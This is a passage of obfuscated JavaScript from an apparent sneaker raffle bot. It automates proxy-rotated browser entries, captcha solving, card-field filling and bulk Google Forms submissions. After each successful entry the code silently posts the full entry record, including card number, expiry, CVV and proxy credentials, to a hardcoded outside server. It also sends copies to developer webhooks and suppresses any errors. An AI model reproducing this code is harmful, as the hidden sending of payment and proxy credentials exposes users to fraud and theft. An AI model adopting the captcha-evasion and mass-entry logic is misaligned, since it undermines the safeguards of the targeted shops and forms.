                            continue;
                        }
                        await _0x1b26eb['type']('input[name=\x22lastName\x22]', '' + _0x40fbd5[_0x4ab4b7]['LastName']), await _0x254c61(0xc8), await _0x1b26eb['type']('input[name=\x22instagramUsername\x22]', '' + _0x40fbd5[_0x4ab4b7]['Follower']), await _0x254c61(0x4b0), await _0x1b26eb['click']('button.btn.continue-button__1RtsS'), await _0x254c61(0x3e8), console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x1b26eb['select']('select[name=\x22country\x22]', '' + _0x40fbd5[_0x4ab4b7]['Country']), await _0x254c61(0x2bc), await _0x1b26eb['type']('input[name=\x22streetName\x22]', '' + _0x40fbd5[_0x4ab4b7]['Address1']), await _0x254c61(0x258), await _0x1b26eb['type']('input[name=\x22houseNumber\x22]', _0x40fbd5[_0x4ab4b7]['HouseNumber'] + '\x20' + _0x40fbd5[_0x4ab4b7]['Address2']), await _0x254c61(0xc8), await _0x1b26eb['type']('input[name=\x22postalCode\x22]', '' + _0x40fbd5[_0x4ab4b7]['Zip']), await _0x254c61(0x1f4), await _0x1b26eb['type']('input[name=\x22city\x22]', '' + _0x40fbd5[_0x4ab4b7]['City']), await _0x254c61(0x4b0), await _0x1b26eb['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x254c61(0x4b0), await _0x1b26eb['click']('button.btn.continue-button__1RtsS'), await _0x254c61(0x4b0), console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x1b26eb['solveRecaptchas'](), console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x254c61(0xbb8), await _0x1b26eb['click']('button.btn.continue-button__1RtsS'), await _0x254c61(0x1388), console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1b26eb['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1b26eb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x254c61(0x4b0), await _0x1b26eb['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x40fbd5[_0x4ab4b7]['CardNumber']), await _0x254c61(0x320), await _0x1b26eb['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1b26eb['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x40fbd5[_0x4ab4b7]['ExpiryDate']), await _0x254c61(0x4b0), await _0x1b26eb['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1b26eb['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x40fbd5[_0x4ab4b7]['CVV']), await _0x254c61(0x226), await _0x1b26eb['type']('input[name=\x22holderName\x22]', '' + _0x40fbd5[_0x4ab4b7]['NameOnCard']), await _0x254c61(0x226), await _0x1b26eb['click']('button.adyen-checkout__button'), console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x1b26eb['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x254c61(0xbb8);
                        } catch (_0x2337a6) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x203DS\x20Failed')), _0x2ed3e7 = '3DS\x20Error\x20' + _0x2337a6;
                            var _0x38101a = await _0x18ad5f(_0x40fbd5[_0x4ab4b7], _0x1b1083, 'dev', !![], _0x2ed3e7);
                            _0xbb7ac1['errorDEV'] = { 'embeds': [_0x38101a] };
                            _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0xbb7ac1['errorDEV']);
                            await _0x2dfd24(_0x3fd40a, _0xbb7ac1['errorDEV']);
                            continue;
                        }
                        _0x547244(_0x40fbd5[_0x4ab4b7], _0x1b1083), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x2e7c9f = _0x40fbd5[_0x4ab4b7];
                        try {
                            prxdata = {
                                'username': _0x4a1218['replace']('#', ''),
                                'module': _0x1b1083['name'],
                                'entrydata': JSON['stringify'](_0x2e7c9f),
                                'proxy': '' + _0x158527[_0x4ab4b7]
                            };
                            var _0x189c47 = JSON['stringify'](prxdata);
                            let _0x33fda6 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x189c47, _0x33fda6);
                        } catch (_0x11714a) {
                        }
                        if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                            try {
                                await _0x2dfd24(_0x24de00['webhook'], _0xbb7ac1['succesDEVMSG']);
                            } catch {
                            }
                        await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0xbb7ac1['succesDEVMSG']), await _0x254c61(0xc8);
                        try {
                            await _0x2dfd24(_0x4f6cb7, _0xbb7ac1['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5f567b) {
                        console['log'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20' + _0x5f567b), _0x2ed3e7 = '' + _0x5f567b;
                        var _0x38101a = await _0x18ad5f(_0x40fbd5[_0x4ab4b7], _0x1b1083, 'dev', !![], _0x2ed3e7);
                        _0xbb7ac1['errorDEV'] = { 'embeds': [_0x38101a] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0xbb7ac1['errorDEV']), await _0x2dfd24(_0x3fd40a, _0xbb7ac1['errorDEV']), _0x4f227d = 'yes';
                    } finally {
                        _0x233a9a['close']();
                        if (_0x4f227d == 'yes' && _0x1fca55 != 0x5) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x1b1083['name'] + ']\x20Task\x20' + (_0x4ab4b7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1fca55 + '\x20/\x205)')), _0x4ab4b7 = _0x4ab4b7 - 0x1, _0x1fca55 = _0x1fca55 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0xd36ac7, _0x17b51c, _0x3caeb0) {
                let _0x3f142f = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x1c5da2 = _0x3e92a1['readFileSync']('forms/templates.json', 'utf-8');
                let _0x3980ff = JSON['parse'](_0x1c5da2), _0x191b19 = ![];
                if (_0x3980ff['length'] != 0x0) {
                    let _0x490bff = 0x0;
                    for (template of _0x3980ff) {
                        if (template['Url'] == _0x17b51c[0x0]['Url']) {
                            _0x191b19 = !![], console['log'](_0x467028['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x467028['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x467028['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x29d73c() {
                                let _0x39a0ed = await _0x40afc7['get']('answer');
                                if (_0x39a0ed['answer']['toLowerCase']() != 'y' && _0x39a0ed['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x29d73c();
                                return _0x39a0ed['answer']['toLowerCase']();
                            }
                            if (await _0x29d73c() == 'n') {
                                _0x3980ff['splice'](_0x490bff, 0x1), console['clear']();
                                break;
                            }
                            _0x3f142f = template, console['clear']();
                            break;
                        }
                        _0x490bff++;
                    }
                }
                let _0x20dbe5 = 0x0, _0x521e15 = 0x0;
                function _0x53444d(_0x20f711) {
                    console['log'](_0x36583e() + '\x20[' + _0xd36ac7['name'] + ']\x20Task\x20' + (_0xf53d11 + 0x1) + '\x20:\x20' + _0x20f711);
                }
                var _0x475eb3 = 0x0;
                for (key in _0x3f142f) {
                    if (key['includes']('custom'))
                        _0x20dbe5++;
                    if (key['includes']('Select'))
                        _0x521e15++;
                }
                for (var _0xf53d11 = 0x0; _0xf53d11 < _0x17b51c['length']; _0xf53d11++) {
                    _0x3f142f['Url'] = _0x17b51c[_0xf53d11]['Url'];
                    let _0x4ceeda = ![];
                    if (_0x3980ff['length'] != 0x0)
                        for (template of _0x3980ff) {
                            if (template['Url'] == _0x17b51c[_0xf53d11]['Url']) {
                                _0x3f142f = template, _0x4ceeda = !![], _0x53444d('Found\x20Template');
                                break;
                            }
                        }
                    var _0x5647b6;
                    if (_0x283225 != 'yes') {
                        if (!_0x283225)
                            var _0x283225 = '';
                        else
                            _0x283225 = '';
                        _0x475eb3 = 0x0;
                    }
                    try {
                        await _0x4626f3(_0x17b51c, _0xf53d11);
                    } catch {
                        _0x283225 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x24de00['useRandomProxy'] = ![])
                        var _0x1457a5 = _0x3caeb0[_0xf53d11]['split'](':');
                    else
                        var _0x322b88 = Math['round'](Math['random']() * (_0x3caeb0['length'] - 0x1)), _0x1457a5 = _0x3caeb0[_0x322b88]['split'](':');
                    var _0x56ea2b;
                    if (_0x1457a5['length'] == 0x1)
                        try {
                            _0x56ea2b = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x56ea2b = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x56ea2b = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1457a5[0x0] + ':' + _0x1457a5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x56ea2b = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1457a5[0x0] + ':' + _0x1457a5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x21a8ce = { 'first': ![] };
                        const _0x44bfbf = await _0x56ea2b['newPage']();
                        if (_0x1457a5['length'] != 0x0)
                            await _0x44bfbf['authenticate']({
                                'username': '' + _0x1457a5[0x2],
                                'password': '' + _0x1457a5[0x3]
                            });
                        _0x53444d('Getting\x20Session');
                        let _0x155b2e = ![];
                        try {
                            await _0x44bfbf['goto'](_0x17b51c[_0xf53d11]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x254c61(0xbb8);
                        } catch (_0x392e3b) {
                            throw new Error(_0x392e3b);
                        }
                        const _0x3466ac = await _0x44bfbf['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x3466ac) {
                            _0x53444d('Login\x20Detected');
                            let _0x22d709 = await _0x3466ac['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x22d709['click'](), _0x155b2e = !![];
                        }
                        let _0x2d1496 = await _0x44bfbf['$']('#identifierId');
                        _0x2d1496 && (_0x155b2e = !![]);
                        await _0x44bfbf['waitForSelector']('.teQAzf');
                        async function _0x2e6ebf() {
                            let _0x34b2a0 = await _0x44bfbf['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x34b2a0) {
                                let _0x33373b;
                                try {
                                    _0x33373b = await question['$eval']('.M7eMe', _0x87d824 => _0x87d824['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x20dbe5 != 0x0) {
                                    let _0x3eb8d4 = ![];
                                    for (let _0x4a1c6c = 0x0; _0x4a1c6c < _0x20dbe5; _0x4a1c6c++) {
                                        if (_0x33373b == _0x3f142f['custom' + _0x4a1c6c]['title']) {
                                            _0x53444d('Custom\x20Selector\x20found;\x20' + _0x33373b);
                                            let _0x131347 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x512362 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x131347)
                                                await _0x131347['type']('' + _0x3f142f['custom' + _0x4a1c6c]['answer']);
                                            else
                                                _0x512362 && await _0x512362['type']('' + _0x3f142f['custom' + _0x4a1c6c]['answer']);
                                            _0x3eb8d4 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x3eb8d4) {
                                        await _0x254c61(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x521e15 != 0x0) {
                                    let _0x510d9e = ![];
                                    for (let _0x2b3552 = 0x0; _0x2b3552 < _0x521e15; _0x2b3552++) {
                                        if (_0x33373b == _0x3f142f[_0x2b3552 + 'Select']['title']) {
                                            _0x53444d('Custom\x20Selector\x20found;\x20' + _0x33373b);
                                            let _0x15c1b5 = await question['$$']('.ulDsOb');
                                            for (opt of _0x3f142f[_0x2b3552 + 'Select']['answer']) {
                                                let _0x239b1a = await _0x15c1b5[opt]['$']('span');
                                                await _0x239b1a['click']();
                                            }
                                            _0x510d9e = !![];
                                            break;
                                        }
                                    }
                                    if (_0x510d9e) {
                                        await _0x254c61(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x33373b == _0x3f142f['0Select']['title']) {
                                        _0x53444d('Custom\x20Selector\x20found;\x20' + _0x3f142f['0Select']['title']);
                                        let _0x137498 = await question['$$']('.ulDsOb'), _0x72517b = await _0x137498[_0x3f142f['0Select']['answer']];
                                        await _0x72517b['click']();
                                        continue;
                                    }
                                    if (_0x33373b == _0x3f142f['1Select']['title']) {
                                        _0x53444d('Custom\x20Selector\x20found;\x20' + _0x3f142f['1Select']['title']);
                                        let _0x599f07 = await question['$$']('.ulDsOb'), _0x44ef43 = await _0x599f07[_0x3f142f['1Select']['answer']];
                                        await _0x44ef43['click']();
                                        continue;
                                    }
                                    if (_0x33373b == _0x3f142f['2Select']['title']) {
                                        _0x53444d('Custom\x20Selector\x20found;\x20' + _0x3f142f['2Select']['title']);
                                        let _0x216698 = await question['$$']('.ulDsOb'), _0x5c08ab = await _0x216698[_0x3f142f['2Select']['answer']];
                                        await _0x5c08ab['click']();
                                        continue;
                                    }
                                } catch (_0x1f0fa6) {
                                }
                                if (_0x33373b['toLowerCase']()['includes']('mail') && !_0x33373b['toLowerCase']()['includes']('agree') || _0x33373b == _0x3f142f['Email']) {
                                    _0x53444d('Mail\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x1f57b1 = await question['$']('input');
                                    !_0x1f57b1 && (_0x1f57b1 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x1f57b1['type'](_0x17b51c[_0xf53d11]['Email']), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('first') || _0x33373b['toLowerCase']() == 'name' || _0x33373b['toLowerCase']() == 'name\x20' || _0x33373b == _0x3f142f['FirstName']) {
                                    _0x53444d('FirstName\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x4858c8 = await question['$']('input');
                                    !_0x4858c8 && (_0x4858c8 = await question['$']('textarea'));
                                    await _0x4858c8['type'](_0x17b51c[_0xf53d11]['FirstName'] + '\x20'), await _0x254c61(0x258);
                                    if (_0x33373b == _0x3f142f['FirstName'])
                                        continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('last') || _0x33373b['toLowerCase']()['includes']('surname') || _0x33373b == _0x3f142f['LastName']) {
                                    _0x53444d('LastName\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0xccd757 = await question['$']('input');
                                    !_0xccd757 && (_0xccd757 = await question['$']('textarea'));
                                    await _0xccd757['type'](_0x17b51c[_0xf53d11]['LastName'] + '\x20'), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('address') && !_0x33373b['toLowerCase']()['includes']('agree') || _0x33373b == _0x3f142f['Address']) {
                                    _0x53444d('Address\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x511d5e = await question['$']('input');
                                    !_0x511d5e && (_0x511d5e = await question['$']('textarea'));
                                    await _0x511d5e['type'](_0x17b51c[_0xf53d11]['Address1'] + '\x20' + _0x17b51c[_0xf53d11]['HouseNumber'] + '\x20' + _0x17b51c[_0xf53d11]['Address2']), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('phone') || _0x33373b['toLowerCase']()['includes']('mobile') || _0x33373b == _0x3f142f['Phone']) {
                                    _0x53444d('Phone\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x1175b4 = await question['$']('input');
                                    !_0x1175b4 && (_0x1175b4 = await question['$']('textarea'));
                                    await _0x1175b4['type']('' + _0x17b51c[_0xf53d11]['Phone']), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('country') || _0x33373b == _0x3f142f['Country']) {
                                    let _0x4a1460 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x4a1460) {
                                        let _0x33a8a7 = ![], _0x4c11c2 = await _0x4a1460['$$']('.ulDsOb');
                                        for (option of _0x4c11c2) {
                                            let _0x874bcf = await option['$']('span'), _0x146840 = await option['$eval']('span', _0x5215e8 => _0x5215e8['textContent']);
                                            if (_0x146840['toLowerCase']() == _0x17b51c[_0xf53d11]['Country']['toLowerCase']()) {
                                                await _0x874bcf['click'](), _0x33a8a7 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x33a8a7) {
                                            const _0x4a7903 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x4a7903['click'](), await _0x4a7903['type'](_0x17b51c[_0xf53d11]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x53444d('Country\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x5b60cb = await question['$']('input');
                                    !_0x5b60cb && (_0x5b60cb = await question['$']('textarea'));
                                    await _0x5b60cb['type']('' + _0x17b51c[_0xf53d11]['Country']), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('city') || _0x33373b == _0x3f142f['City']) {
                                    _0x53444d('City\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x28742b = await question['$']('input');
                                    !_0x28742b && (_0x28742b = await question['$']('textarea'));
                                    await _0x28742b['type']('' + _0x17b51c[_0xf53d11]['City']), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('zip') || _0x33373b == _0x3f142f['Zip']) {
                                    _0x53444d('Zip\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x1f1dd9 = await question['$']('input');
                                    !_0x1f1dd9 && (_0x1f1dd9 = await question['$']('textarea'));
                                    await _0x1f1dd9['type']('' + _0x17b51c[_0xf53d11]['Zip']), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('insta') || _0x33373b == _0x3f142f['Follower']) {
                                    _0x53444d('Follower\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x302406 = await question['$']('input');
                                    !_0x302406 && (_0x302406 = await question['$']('textarea'));
                                    await _0x302406['type']('' + _0x17b51c[_0xf53d11]['Follower']), await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('size') || _0x33373b == _0x3f142f['Size']) {
                                    _0x53444d('Size\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x375d26 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x375d26) {
                                        let _0x29f5ef = await _0x375d26['$$']('.ulDsOb');
                                        if (_0x17b51c[_0xf53d11]['Size']['toLowerCase']() == 'random') {
                                            var _0x12ad66 = Math['round'](Math['random']() * (_0x29f5ef['length'] - 0x1));
                                            await _0x29f5ef[_0x12ad66]['click']();
                                        } else
                                            for (size of _0x29f5ef) {
                                                let _0x5ee70c = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x3c127b => _0x3c127b['textContent']);
                                                if (_0x5ee70c['toLowerCase']()['includes'](_0x17b51c[_0xf53d11]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x5e74a0 = await question['$']('.ry3kXd');
                                    if (_0x5e74a0) {
                                        await _0x5e74a0['click'](), await _0x254c61(0x9c4);
                                        let _0x3ab7e4 = await _0x44bfbf['$']('div[jsname=\x22V68bde\x22]'), _0x2c2a65 = await _0x3ab7e4['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x2c2a65) {
                                            let _0x256b74 = await size['$eval']('.vRMGwf.oJeWuf', _0x4498d2 => _0x4498d2['textContent']), _0x59cd3f = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x256b74['toLowerCase']()['includes'](_0x17b51c[_0xf53d11]['Size'])) {
                                                await _0x254c61(0x190), await _0x59cd3f['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('receive') || _0x33373b['toLowerCase']()['includes']('method')) {
                                    _0x53444d('Method\x20Selector\x20found;\x20' + _0x33373b);
                                    let _0x5647e9 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x5647e9) {
                                        const _0x517a63 = await _0x5647e9['$$']('.ulDsOb');
                                        for (size of _0x517a63) {
                                            let _0x52a0e3 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x11d727 => _0x11d727['textContent']);
                                            if (_0x52a0e3['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x254c61(0x258);
                                    continue;
                                }
                                if (_0x33373b['toLowerCase']()['includes']('offers') || _0x33373b['toLowerCase']()['includes']('agree')) {
                                    _0x53444d('Authorization\x20Selector\x20found;\x20' + _0x33373b);
                                    const _0x5ab8bc = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x5ab8bc) {
                                        const _0x466b1e = await _0x5ab8bc['$$']('.ulDsOb');
                                        for (size of _0x466b1e) {
                                            let _0x525951 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x2bc267 => _0x2bc267['textContent']);
                                            if (_0x525951['toLowerCase']()['includes']('authorize') || _0x525951['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x254c61(0x258);
                                    continue;
                                }
                                async function _0x4f1fde() {
                                    let _0x460ee2 = await question['$']('.oyXaNc');
                                    if (_0x460ee2) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x467028['cyan'](_0x33373b) + '\x0a');
                                        let _0x38c228 = await question['$$']('.ulDsOb');
                                        for (let _0x17da6f = 0x0; _0x17da6f < _0x38c228['length']; _0x17da6f++) {
                                            let _0x539595 = await _0x38c228[_0x17da6f]['$eval']('span', _0x5d22ff => _0x5d22ff['textContent']);
                                            console['log']('\x20(' + _0x17da6f + ')\x20' + _0x539595);
                                        }
                                        console['log']();
                                        let _0x274789 = await _0x40afc7['get']('option'), _0x33fe9e = await _0x38c228[_0x274789['option']]['$eval']('span', _0x4649dc => _0x4649dc['textContent']);
                                        _0x3f142f[_0x521e15 + 'Select'] = {
                                            'title': _0x33373b,
                                            'answer': _0x274789['option']['split'](',')
                                        };
                                        let _0x2e2091 = await _0x38c228[_0x274789['option']]['$']('span');
                                        await _0x2e2091['click'](), _0x521e15++;
                                        return;
                                    }
                                    let _0xe58233 = await question['$']('.Y6Myld');
                                    if (_0xe58233) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x467028['cyan'](_0x33373b) + '\x0a');
                                        let _0x205897 = await question['$$']('.ulDsOb');
                                        for (let _0x461016 = 0x0; _0x461016 < _0x205897['length']; _0x461016++) {
                                            let _0x1b0602 = await _0x205897[_0x461016]['$eval']('span', _0x37ccce => _0x37ccce['textContent']);
                                            console['log']('\x20(' + _0x461016 + ')\x20' + _0x1b0602);
                                        }
                                        console['log']();
                                        let _0x585f43 = await _0x40afc7['get']('option');
                                        _0x3f142f[_0x521e15 + 'Select'] = {
                                            'title': _0x33373b,
                                            'answer': _0x585f43['option']['split'](',')
                                        };
                                        for (opt of _0x3f142f[_0x521e15 + 'Select']['answer']) {
                                            let _0x2710ef = await _0x205897[opt]['$']('span');
                                            await _0x2710ef['click']();
                                        }
                                        _0x521e15++;
                                        return;
                                    }
                                    var _0x1fde4b = 0x0;
                                    let _0x5a3185 = Object['keys'](_0x3f142f);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x467028['cyan'](_0x33373b) + '\x0a');
                                    for (data of _0x5a3185) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x1fde4b + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x1fde4b + ')\x20' + data), _0x1fde4b++;
                                    }
                                    console['log']('\x20(' + _0x5a3185['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x1c18d2 = await _0x40afc7['get']('input');
                                    if (_0x1c18d2['input'] == _0x5a3185['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x2b852d = await _0x40afc7['get']('input');
                                        _0x3f142f['custom' + _0x20dbe5] = {
                                            'title': _0x33373b,
                                            'answer': '' + _0x2b852d['input']
                                        };
                                        let _0x302d3b = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x4b4cdb = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x302d3b)
                                            await _0x302d3b['type']('' + _0x3f142f['custom' + _0x20dbe5]['answer']);
                                        else
                                            _0x4b4cdb && await _0x4b4cdb['type']('' + _0x3f142f['custom' + _0x20dbe5]['answer']);
                                        _0x20dbe5++;
                                        return;
                                    }
                                    _0x3f142f['' + _0x5a3185[_0x1c18d2['input']]] = _0x33373b;
                                    let _0x2e8ada = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x4721a0 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x2e8ada && await _0x2e8ada['type']('' + _0x17b51c[_0xf53d11]['' + _0x5a3185[_0x1c18d2['input']]]), _0x4721a0 && await _0x4721a0['type']('' + _0x17b51c[_0xf53d11]['' + _0x5a3185[_0x1c18d2['input']]]), await _0x254c61(0x258);
                                }
                                await _0x4f1fde(), await _0x254c61(0x37a);
                            }
                            let _0x207a98 = await _0x44bfbf['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x207a98)
                                return await _0x207a98['click'](), await _0x44bfbf['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x53444d('New\x20Section'), _0x2e6ebf();
                        }
                        await _0x2e6ebf(), await _0x44bfbf['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x44bfbf['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x547244(_0x17b51c[_0xf53d11], _0xd36ac7), _0x283225 = 'no';
                        var _0x5b904e = await _0x18ad5f(_0x17b51c[_0xf53d11], _0xd36ac7, 'dev', ![]), _0x2e3d56 = await _0x18ad5f(_0x17b51c[_0xf53d11], _0xd36ac7, 'pub', ![]);
                        let _0x309853 = _0x17b51c[_0xf53d11];
                        try {
                            prxdata = {
                                'username': _0x4a1218['replace']('#', ''),
                                'module': _0xd36ac7['name'],
                                'entrydata': JSON['stringify'](_0x309853),
                                'proxy': '' + _0x3caeb0[_0xf53d11]
                            };
                            var _0x24cd24 = JSON['stringify'](prxdata);
                            let _0x427690 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x24cd24, _0x427690);
                        } catch (_0x41357c) {
                        }
                        const _0x54d9fc = {
                            'succesDEVMSG': { 'embeds': [_0x5b904e] },
                            'succesPUBMSG': { 'embeds': [_0x2e3d56] }
                        };
                        try {
